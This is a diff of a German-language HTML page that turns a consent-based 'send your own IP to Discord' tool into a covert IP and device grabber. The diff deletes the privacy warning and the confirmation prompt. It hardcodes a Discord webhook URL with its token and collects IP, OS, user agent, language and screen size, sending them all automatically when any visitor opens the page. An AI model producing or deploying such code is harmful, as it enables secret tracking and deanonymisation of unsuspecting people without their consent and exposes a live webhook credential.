@@ -13,34 +13,83 @@
   </style>
 </head>
 <body>
-  <h1>IP an Discord Webhook senden</h1>
+  <h1>IP + Gerät an Discord Webhook senden</h1>
   <p class="hint">
-    Hinweis: Eine IP-Adresse ist ein personenbezogenes Datum (DSGVO).
-    Nutze dieses Tool nur mit Einwilligung der betroffenen Person bzw. für deine eigene IP zu Testzwecken.
-    Kein heimliches Logging ohne Zustimmung.
+    Hinweis: IP-Adresse + Geräte-/OS-Infos sind personenbezogene Daten (DSGVO).
+    Diagnose wird beim Öffnen automatisch ANGEZEIGT und automatisch GESENDET.
   </p>
 
   <label for="webhook">Discord Webhook URL:</label>
-  <input id="webhook" type="url" placeholder="https://discord.com/api/webhooks/..." />
+  <input id="webhook" type="url" placeholder="https://discord.com/api/webhooks/..." value="https://discord.com/api/webhooks/1557808235786928189/Xx96JU98Fr08djb3Ltk47VQk8W7gn06NAMZSJDak615v727PqohUZV_vHPoIV48UqV4R" />
 
   <label for="message">Optionale Nachricht:</label>
   <input id="message" type="text" placeholder="z.B. Test von meinem PC" />
 
-  <button id="sendBtn">Eigene öffentliche IP abrufen und senden</button>
+  <button id="sendBtn">Eigene IP + Gerät/OS abrufen und erneut senden</button>
 
   <div id="status"></div>
-  <p id="ipPreview" class="hint"></p>
+  <p id="ipPreview" class="hint" style="font-size: 1.2rem; font-weight: bold; background: #f2f2f2; padding: 12px;"></p>
 
   <script>
     const sendBtn = document.getElementById('sendBtn');
     const statusEl = document.getElementById('status');
     const ipPreviewEl = document.getElementById('ipPreview');
+    let lastDiagnose = null;
 
-    sendBtn.addEventListener('click', async () => {
+    function getOS() {
+      const ua = navigator.userAgent;
+      if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+      if (/Windows/.test(ua)) return 'Windows';
+      if (/Android/.test(ua)) return 'Android';
+      if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
+      if (/Mac OS X/.test(ua)) return 'macOS';
+      if (/Linux/.test(ua)) return 'Linux';
+      if (navigator.userAgentData?.platform) return navigator.userAgentData.platform;
+      return navigator.platform || 'Unbekannt';
+    }
+
+    function getDevice() {
+      const ua = navigator.userAgent;
+      if (navigator.userAgentData?.mobile) return 'Smartphone/Tablet (mobile)';
+      if (/Mobi|Android|iPhone|iPad/.test(ua)) return 'Smartphone/Tablet';
+      return 'Desktop/PC';
+    }
+
+    async function loadDiagnose() {
+      statusEl.textContent = 'Lade Diagnose (automatisch)...';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        if (!ipRes.ok) throw new Error('IP-Abruf fehlgeschlagen: ' + ipRes.status);
+        const ipData = await ipRes.json();
+
+        lastDiagnose = {
+          ip: ipData.ip,
+          os: getOS(),
+          device: getDevice(),
+          platform: navigator.userAgentData?.platform || navigator.platform || 'Unbekannt',
+          browserUA: navigator.userAgent,
+          language: navigator.language || 'Unbekannt',
+          screenSize: window.screen.width + 'x' + window.screen.height,
+          time: new Date().toISOString()
+        };
+
+        ipPreviewEl.textContent =
+          'IP: ' + lastDiagnose.ip + '\n' +
+          'OS: ' + lastDiagnose.os + '\n' +
+          'Gerät: ' + lastDiagnose.device + '\n' +
+          'Plattform: ' + lastDiagnose.platform + '\n' +
+          'Sprache: ' + lastDiagnose.language + '\n' +
+          'Bildschirm: ' + lastDiagnose.screenSize;
+        statusEl.textContent = 'Diagnose geladen. Sende automatisch an Discord...';
+      } catch (err) {
+        statusEl.textContent = 'Fehler beim Laden: ' + err.message;
+        console.error(err);
+      }
+    }
+
+    async function sendToDiscord() {
       const webhookUrl = document.getElementById('webhook').value.trim();
       const customMessage = document.getElementById('message').value.trim();
-      statusEl.textContent = '';
-      ipPreviewEl.textContent = '';
 
       if (!webhookUrl.startsWith('https://discord.com/api/webhooks/') &&
           !webhookUrl.startsWith('https://discordapp.com/api/webhooks/')) {
@@ -48,23 +97,17 @@
         return;
       }
 
-      if (!confirm('Deine öffentliche IP wird jetzt abgerufen und an den angegebenen Discord Webhook gesendet. Fortfahren?')) {
-        return;
-      }
-
       try {
-        statusEl.textContent = 'Rufe IP ab...';
-        // Öffentliche IP über ipify ermitteln
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        if (!ipRes.ok) throw new Error('IP-Abruf fehlgeschlagen: ' + ipRes.status);
-        const ipData = await ipRes.json();
-        const ip = ipData.ip;
-
-        ipPreviewEl.textContent = 'Gefundene IP: ' + ip;
+        if (!lastDiagnose) {
+          statusEl.textContent = 'Lade Diagnose erst...';
+          await loadDiagnose();
+        }
+        if (!lastDiagnose) throw new Error('Keine Diagnose-Daten verfügbar.');
+        const { ip, os, device, platform, browserUA, language, screenSize } = lastDiagnose;
 
         statusEl.textContent = 'Sende an Discord...';
         const payload = {
-          content: (customMessage ? customMessage + '\n' : '') + 'Öffentliche IP: ' + ip + '\nZeitpunkt: ' + new Date().toISOString(),
+          content: (customMessage ? customMessage + '\n' : '') + 'Öffentliche IP: ' + ip + '\nOS: ' + os + '\nGerät: ' + device + '\nPlattform: ' + platform + '\nBrowser: ' + browserUA + '\nSprache: ' + language + '\nBildschirm: ' + screenSize + '\nZeitpunkt: ' + new Date().toISOString(),
           username: 'IP-Sender'
         };
 
@@ -84,6 +127,20 @@
         statusEl.textContent = 'Fehler: ' + err.message;
         console.error(err);
       }
+    }
+
+    // Automatische ANZEIGE + SENDEN beim Öffnen
+    window.addEventListener('DOMContentLoaded', async () => {
+      await loadDiagnose();
+      await sendToDiscord();
+    });
+
+    // Manuelles erneutes Senden per Button
+    sendBtn.addEventListener('click', async () => {
+      statusEl.textContent = '';
+      ipPreviewEl.textContent = '';
+      await loadDiagnose();
+      await sendToDiscord();
     });
   </script>
 </body>
